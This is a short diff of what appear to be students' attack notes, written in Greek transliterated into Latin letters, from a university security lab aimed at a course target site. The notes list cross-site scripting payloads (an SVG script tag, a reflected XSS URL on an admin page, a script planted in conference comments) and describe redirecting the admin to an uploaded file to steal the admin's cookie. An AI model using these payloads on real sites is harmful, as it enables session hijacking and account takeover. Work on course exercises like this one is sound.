@@ -123,3 +123,8 @@ TzeniPantazi<svg xmlns="#"><script>alert(1)</script></svg>
 THANOS:
 http://the-intruders.csec.chatzi.org/modules/admin/change_user.php/"><script>alert(1)</script>
 vriskw link tou arxeioy poy exw kanei upload kai to kalw me window.location.href="link" kai pairnei to cookie tou admin
+opws kai se ola ta shmeia xss
+
+http://the-intruders.csec.chatzi.org/modules/conference/conference.php
+vazw se sxolia to <script>window.location...</script>
+
